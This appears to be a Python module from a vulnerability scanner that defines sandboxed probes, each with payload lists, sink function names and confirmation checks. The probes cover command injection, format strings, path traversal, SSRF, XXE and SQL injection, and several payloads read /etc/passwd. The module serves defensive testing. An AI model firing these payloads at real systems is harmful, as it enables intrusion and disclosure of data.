"""Deterministic injection PoC probes (no fuzzing): command injection, format string, path
traversal. Each probe knows the sinks that make it relevant, a set of payloads carrying a
unique per-run marker, and an output-based confirmation predicate -- so a static candidate
becomes a *confirmed* finding with a working demonstrating input, verified in the sandbox.

Confirmation is proof-by-effect: the injected command's marker appears in output (CWE-78), the
format directives leaked pointers instead of echoing verbatim (CWE-134), or /etc/passwd content
came back (CWE-22). Reachability is the same honest limit as the overflow synthesizer: the
payload is delivered to the entry channel, so it reaches input-driven sinks.
"""
from __future__ import annotations

import re


def cmdi_payloads(marker: str):
    m = marker
    # shell metacharacters that break out of system()/popen() argument construction
    return [f"; echo {m}", f"$(echo {m})", f"`echo {m}`", f"| echo {m}", f"&& echo {m}",
            f"' ; echo {m} ; '", f'" ; echo {m} ; "', f"\n echo {m}\n"]


def cmdi_confirm(out: bytes, payload: str, marker: str) -> bool:
    # the marker must appear because the injected `echo` RAN -- not because the program echoed
    # our payload verbatim. If the literal "echo <marker>" is still in the output, it was printed,
    # not executed, so that is not a confirmation.
    mk = marker.encode()
    return mk in out and (b"echo " + mk) not in out


def fmt_payloads(marker: str):
    return [marker.encode() + b".%p.%p.%p.%p.%p.%p.%p.%p",
            marker.encode() + b"%x.%x.%x.%x.%x.%x.%x.%x"]


def fmt_confirm(out: bytes, payload: bytes, marker: str) -> bool:
    mk = marker.encode()
    if mk not in out:
        return False
    seg = out.split(mk, 1)[1][:200]
    if b"%p" in seg or b"%x" in seg:
        return False                                  # directives echoed verbatim -> not a fmt bug
    # interpreted directives leak pointers: hex words or (nil)/(null)
    return len(re.findall(rb"0x[0-9a-fA-F]+", seg)) >= 2 or b"(nil)" in seg or b"(null)" in seg


def sqli_payloads(marker: str):
    """UNION-based SQL injection payloads carrying `marker` as a selected column. If the input is
    concatenated into a query, the DB itself returns the marker as a row -- a forgery-proof oracle
    (a non-injectable target treats the payload as a literal string and never emits the marker). The
    original SELECT's arity is unknown, so a few column counts are tried, across single-quote,
    double-quote and numeric (unquoted) contexts, each terminated with a SQL comment."""
    m, out = marker, []
    # break out of: a single-quoted literal, a double-quoted literal, or an unquoted numeric field.
    for prefix in ("' ", '" ', "0 "):
        for n in (1, 2, 3, 4, 5):
            cols = ",".join([f"'{m}'"] + ["'x'"] * (n - 1))
            out.append(f"{prefix}UNION SELECT {cols}-- ")        # sqlite / mysql / pg line comment
            out.append(f"{prefix}UNION SELECT {cols}#")          # mysql hash comment
    return out


def sqli_confirm(out: bytes, payload, marker: str) -> bool:
    # the marker must surface because the UNION SELECT RAN (the DB returned it as a row), NOT because
    # the program echoed our payload verbatim: if the whole payload (which contains the marker) is
    # still present in the output it was reflected, not executed -- same test shape as cmdi_confirm.
    mk = marker.encode()
    pb = payload if isinstance(payload, bytes) else payload.encode()
    return mk in out and pb not in out


def traversal_payloads():
    return [b"../../../../../../../../etc/passwd", b"..%2f..%2f..%2f..%2fetc/passwd",
            b"....//....//....//....//etc/passwd", b"/etc/passwd"]


def traversal_confirm(out: bytes, payload: bytes, marker: str) -> bool:
    return re.search(rb"root:.?:0:0:", out) is not None or b"root:x:0:" in out


def ssrf_payloads(marker=None):
    """Server-side request forgery: the fetched URL is attacker-controlled. The `file:` scheme
    demonstrates it OFFLINE (the server fetches a local file of our choosing); confirmed by the
    file content coming back. An internal-network pivot (http://169.254.169.254/, localhost
    services) is the same primitive but needs a live environment to observe."""
    return [b"file:///etc/passwd", b"file://localhost/etc/passwd", b"file:/etc/passwd",
            b"FILE:///etc/passwd"]


def xxe_payloads(marker=None):
    """XML external-entity file-disclosure documents: a SYSTEM entity pointing at /etc/passwd, in a
    few DTD/entity forms. Confirmed by the file's content coming back (same oracle as traversal)."""
    return [
        b'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>',
        b'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "/etc/passwd">]><r>&xxe;</r>',
        b'<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>',
        b'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "file:///etc/passwd">'
        b'<!ENTITY xxe "%p;">]><r>&xxe;</r>',
    ]


# name -> {cwe, severity, sinks, payloads(marker)->list, confirm(out,payload,marker)->bool, title}
PROBES = {
    "command-injection": {
        "cwe": "CWE-78", "severity": "critical",
        "sinks": {"system", "popen", "execl", "execlp", "execv", "execve", "execvp"},
        "payloads": lambda m: cmdi_payloads(m), "confirm": cmdi_confirm,
        "title": "OS command injection", "binary": False},
    "format-string": {
        "cwe": "CWE-134", "severity": "high",
        "sinks": {"printf", "fprintf", "sprintf", "snprintf", "vprintf", "vfprintf",
                  "syslog", "err", "warn"},
        "payloads": lambda m: fmt_payloads(m), "confirm": fmt_confirm,
        "title": "Format string", "binary": True},
    "path-traversal": {
        "cwe": "CWE-22", "severity": "high",
        "sinks": {"fopen", "fopen64", "open", "open64", "freopen"},
        "payloads": lambda m: traversal_payloads(), "confirm": traversal_confirm,
        "title": "Path traversal", "binary": True},
    "ssrf": {
        "cwe": "CWE-918", "severity": "high",
        # a user-controlled URL handed to an HTTP/URL client. curl is the dominant C one.
        "sinks": {"curl_easy_setopt", "curl_easy_perform", "curl_easy_init", "curl_url_set"},
        "payloads": lambda m: ssrf_payloads(m), "confirm": traversal_confirm,
        "title": "Server-side request forgery (SSRF)", "binary": True},
    "xxe": {
        "cwe": "CWE-611", "severity": "high",
        # libxml2 / libexpat document-parse entry points. Entity substitution must be enabled for
        # the disclosure to fire (XML_PARSE_NOENT); a target with it off simply never confirms.
        "sinks": {"xmlReadMemory", "xmlReadFile", "xmlReadDoc", "xmlReadFd", "xmlParseMemory",
                  "xmlParseFile", "xmlParseDoc", "xmlCtxtReadMemory", "xmlCtxtReadFile",
                  "xmlCtxtReadDoc", "xmlParseDocument", "XML_Parse"},
        "payloads": lambda m: xxe_payloads(m), "confirm": traversal_confirm,
        "title": "XML external entity (XXE)", "binary": True},
    "sql-injection": {
        "cwe": "CWE-89", "severity": "critical",
        # the query-string sinks (sqlite / mysql / postgres). A prepared-statement API that binds
        # parameters is NOT here -- only the string-concatenation execs an injection can reach.
        "sinks": {"sqlite3_exec", "sqlite3_get_table", "sqlite3_prepare", "sqlite3_prepare_v2",
                  "mysql_query", "mysql_real_query", "PQexec", "PQexecParams"},
        "payloads": lambda m: sqli_payloads(m), "confirm": sqli_confirm,
        "title": "SQL injection", "binary": True},
}
